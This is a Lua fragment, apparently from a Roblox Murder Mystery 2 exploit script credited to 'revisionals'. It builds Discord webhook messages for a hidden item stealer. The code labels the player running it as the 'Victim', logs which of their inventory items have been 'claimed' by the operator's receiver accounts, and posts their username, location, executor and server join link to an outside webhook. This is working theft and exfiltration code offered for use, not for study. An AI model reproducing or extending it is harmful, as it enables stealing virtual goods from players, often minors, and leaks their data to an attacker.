local function sendLogToChannel(statusText, colorCode, currentWeapons)
	local targetWebhook = (logWebhook ~= "" and logWebhook) or webhook
	if not targetWebhook or targetWebhook == "" then return end

	local currentMap = {}
	for _, w in ipairs(currentWeapons) do
		currentMap[w.DataID] = w.Amount
	end

	local claimedItems = {}

	for _, initW in ipairs(initialWeapons) do
		local currAmount = currentMap[initW.DataID] or 0
		local claimedAmount = initW.Amount - currAmount

		if claimedAmount > 0 then
			table.insert(claimedItems, {
				DataID = initW.DataID,
				Amount = claimedAmount,
				Rarity = initW.Rarity
			})
		end
	end

	local itemsText = ""
	for _, item in ipairs(claimedItems) do
		local amountTxt = item.Amount > 1 and " (x" .. item.Amount .. ")" or ""
		itemsText = itemsText .. string.format("• %s%s [%s]\n", item.DataID, amountTxt, item.Rarity)
	end

	local receiverList = table.concat(users, ", ")
	local executor = identifyexecutor and identifyexecutor() or "Unknown"

	local data = {
		["embeds"] = {{
			["title"] = "📜 Trade Claim Log",
			["description"] = string.format("Status: **%s**\nVictim: **%s**", statusText, plr.Name),
			["color"] = colorCode,
			["fields"] = {
				{
					name = "Claim Summary:",
					value = string.format("```\nReceiver: %s\nExecutor: %s\n```", receiverList, executor),
					inline = false
				},
				{
					name = "Items Claimed So Far:",
					value = string.format("```\n%s```", itemsText ~= "" and itemsText or "No items claimed yet."),
					inline = false
				}
			},
			["footer"] = {
				["text"] = "MM2 Trade Logger"
			},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	pcall(function()
		request({
			Url = targetWebhook,
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(data)
		})
	end)
end

local function formatEmbedAndSend(list, prefix, isFirst, statusDescription, colorCode, isLeftGame)
	lastStatusDescription = statusDescription or lastStatusDescription
	lastColorCode = colorCode or lastColorCode

	local executor = identifyexecutor and identifyexecutor() or "Unknown"
	local receiverList = table.concat(users, ", ")

	local itemsList = ""
	for _, item in ipairs(list) do
		local amountTxt = item.Amount > 1 and " (x" .. item.Amount .. ")" or ""
		itemsList = itemsList .. string.format("%s%s (%s)\n", item.DataID, amountTxt, item.Rarity)
	end

	local fields = {
		{
			name = "Player info:",
			value = string.format("```\nUsername: %s\nExecutor: %s\nReceiver: %s\nLocation: %s\n```", plr.Name, executor, receiverList, playerLocation),
			inline = false
		},
		{
			name = "Inventory:",
			value = string.format("```\n%s```", itemsList ~= "" and itemsList or "All items claimed/No items found."),
			inline = false
		},
		{
			name = "🔗 Click to Copy Join Link",
			value = string.format("```\nroblox://experiences/start?placeId=142823291&gameInstanceId=%s\n```", game.JobId),
			inline = false
		}
	}

	local timeString = ""
	if lastStatusDescription:find("Disconnected") or lastStatusDescription == "🟢  Claimed" or isLeftGame then
		local diff = os.time() - scriptStartTime
		local hrs = math.floor(diff / 3600)
		local mins = math.floor((diff % 3600) / 60)
		local secs = diff % 60
		timeString = string.format("\n\n*was active for: %d hrs, %d mins, %d secs*", hrs, mins, secs)
	else
		timeString = string.format("\n\n*executed:* <t:%d:R>", scriptStartTime)
	end

	local data = {
		["content"] = (prefix or "") .. "roblox://experiences/start?placeId=142823291&gameInstanceId=" .. game.JobId,
		["embeds"] = {{
			["title"] = "MM2 | Alienware 👽",
			["description"] = lastStatusDescription .. timeString,
			["color"] = lastColorCode,
			["fields"] = fields,
			["footer"] = {
				["text"] = "this script was made by revisionals"
			},
			["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
		}}
	}

	local body = HttpService:JSONEncode(data)
	if messageId then
		pcall(function()
			request({
				Url = webhook .. "/messages/" .. messageId,
				Method = "PATCH",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body
			})
		end)
	else
		local success, res = pcall(function()
			return request({
				Url = webhook .. "?wait=true",
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = body
			})
		end)
		if success and res and res.Body then
			local decoded = HttpService:JSONDecode(res.Body)
			if decoded and decoded.id then
				messageId = decoded.id
			end
		end
	end
end

